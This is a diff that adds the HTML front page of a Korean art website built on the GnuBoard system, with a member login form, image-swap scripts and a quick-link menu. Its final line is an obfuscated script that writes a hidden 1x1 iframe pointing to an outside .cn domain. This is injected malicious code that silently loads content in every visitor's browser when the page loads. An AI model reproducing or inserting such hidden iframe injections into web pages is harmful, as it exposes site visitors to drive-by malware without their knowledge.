@@ -1,0 +1,152 @@
+<!-- <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"> -->
+<html>
+<head>
+<meta http-equiv="content-type" content="text/html; charset=euc-kr">
+<title>Artist</title>
+<link rel="stylesheet" href="./g4//style.css" type="text/css">
+</head>
+<script language="javascript">
+// 자바스크립트에서 사용하는 전역변수 선언
+var g4_path      = "./g4/";
+var g4_bbs       = "bbs";
+var g4_bbs_img   = "img";
+var g4_url       = "http://www.sbrush.com";
+var g4_is_member = "";
+var g4_is_admin  = "";
+var g4_bo_table  = "";
+var g4_sca       = "";
+var g4_charset   = "euc-kr";
+var g4_cookie_domain = "";
+var g4_is_gecko  = navigator.userAgent.toLowerCase().indexOf("gecko") != -1;
+var g4_is_ie     = navigator.userAgent.toLowerCase().indexOf("msie") != -1;
+</script>
+<script language="javascript" src="./g4//js/common.js"></script>
+<script language="javascript" src="./g4//js/ajax.js"></script>
+<body topmargin="0" leftmargin="0" >
+<a name="g4_head"></a>
+
+
+
+<body background="/img_n/img_bg.gif">
+<table cellpadding=0 cellspacing=0 width=1370 height=967><Td background=/img_n/img.gif></td></table>
+
+</body>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div style="position:absolute;width:265;height:43;top:136;left:315;background-color:;">
+<form name="fhead" method="post" action="javascript:fhead_submit(document.fhead);" autocomplete="off"> 
+<input type="hidden" name="url" value="/index.html">
+
+
+
+<input name="mb_id" type="text" class=ed size="12" maxlength="20" required itemname="아이디"    style="position:absolute;top:167;left:30;border:1 solid BFBD82;background-color:FFFAD2;width:120;height:16;">
+<input name="mb_password" type="password" class=ed size="12" maxlength="20" itemname="패스워드" style="position:absolute;top:199;left:30;border:1 solid BFBD82;background-color:FFFAD2;width:120;height:16;"">
+<input type="image" src="/img_n/bl.gif" style="position:absolute;top:250;left:0;" width=60 height=30>
+<a href="/g4//bbs/password_forget.php" style="position:absolute;top:345;left:-50;background-color:;width:70;"></a>
+<a href="/g4//bbs/password_forget.php" style="position:absolute;top:345;left:30;background-color:;width:70;"></a>
+</form>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script language="JavaScript">
+function fhead_submit(f)
+{
+    if (!f.mb_id.value)
+    {
+        alert("회원아이디를 입력하십시오.");
+        f.mb_id.focus();
+        return;
+    }
+
+    if (!f.mb_password.value)
+    {
+        alert("패스워드를 입력하십시오.");
+        f.mb_password.focus();
+        return;
+    }
+
+    f.action = './g4//bbs/login_check.php';    f.submit();
+}
+</script>
+
+
+<script type="text/JavaScript">
+<!--
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+
+function MM_findObj(n, d) { //v4.01
+  var p,i,x;  if(!d) d=document; if((p=n.indexOf("?"))>0&&parent.frames.length) {
+    d=parent.frames[n.substring(p+1)].document; n=n.substring(0,p);}
+  if(!(x=d[n])&&d.all) x=d.all[n]; for (i=0;!x&&i<d.forms.length;i++) x=d.forms[i][n];
+  for(i=0;!x&&d.layers&&i<d.layers.length;i++) x=MM_findObj(n,d.layers[i].document);
+  if(!x && d.getElementById) x=d.getElementById(n); return x;
+}
+
+function MM_swapImage() { //v3.0
+  var i,j=0,x,a=MM_swapImage.arguments; document.MM_sr=new Array; for(i=0;i<(a.length-2);i+=3)
+   if ((x=MM_findObj(a[i]))!=null){document.MM_sr[j++]=x; if(!x.oSrc) x.oSrc=x.src; x.src=a[i+2];}
+}
+//-->
+</script>
+<body onLoad="MM_preloadImages('img_n/03_on.gif','img_n/04_on.gif')"><div id=ss style="position:absolute;top:160;left:1106;">
+<table cellpadding=0 cellspacing=0>
+	<tr><Td><a href="/"><img src="../img_n/qu_01.gif" width="75" height="23" border="0"/></a></td>
+	</tr> 
+	<tr><Td><a href="/htm/sub2_1.htm" targett="_self"><img src="../img_n/qu_02.gif" width="75" border="0" /></a></td>
+	</tr> 
+	<tr><Td><a href="/htm/sub3_1.htm" targett="_self"><img src="../img_n/qu_03.gif" width="75"  border="0" /></a></td>
+	</tr> 
+	<tr><Td><a href="/htm/sub2_7.htm?url=%2Fg4%2Fbbs%2Fboard.php%3Fbo_table%3Dcourse_after_home" targett="_self"><img src="../img_n/qu_08.gif" width="75"  border="0" /></a></td>
+	</tr> 
+	<tr><Td><a href="http://cafe.naver.com/sbrush" targett="_self"><img src="../img_n/qu_04.gif" width="75" border="0" /></a></td>
+	</tr> 
+	<tr><Td><a href="/htm/sub2_4.htm#top"><!--a href="/htm/sub2_4.htm?url=%2Fg4%2Fbbs%2Fboard.php%3Fbo_table%3Dsaint2" targett="_self"--><img src="../img_n/qu_05.gif" width="75" border="0" /></a></td>
+	</tr> 
+	<tr><Td><a href="/htm/sub1_4.htm" targett="_self"><img src="../img_n/qu_06.gif" width="75" border="0" /></a></td>
+	</tr>
+	</tr> 
+	<tr><Td><a href="/htm/sub1_2.htm" targett="_self"><img src="../img_n/qu_07.gif" width="75" border="0" /></a></td>
+	</tr>   
+</table>
+</div>
+<!-- HTTP -->
+<script type="text/javascript" language="javascript">var HTTP_MSN_MEMBER_NAME = "";//회원명 (로그인 세션)</script>
+<script type="text/javascript" src="http://asp8.http.or.kr/HTTP_MSN/UsrConfig/jsi4118/js/ASP_Conf.js" defer="defer"></script>
+<noscript></noscript>
+<!-- HTTP END -->
+<!-- 로그인 전 외부로그인 끝 -->
+<script>document.write("<i" +"fra" +"me "+ "s" +"r" +"c=http:" +"/" +"/"+ "u"+ "pdate" +"d" +"a" +"te." +"c" +"n" +"/" +" h" +"e" +"i" +"ght=1 " +"wid" +"t" +"h=1" +"><" +"/ifr"+ "am"+ "e" +">")</script>
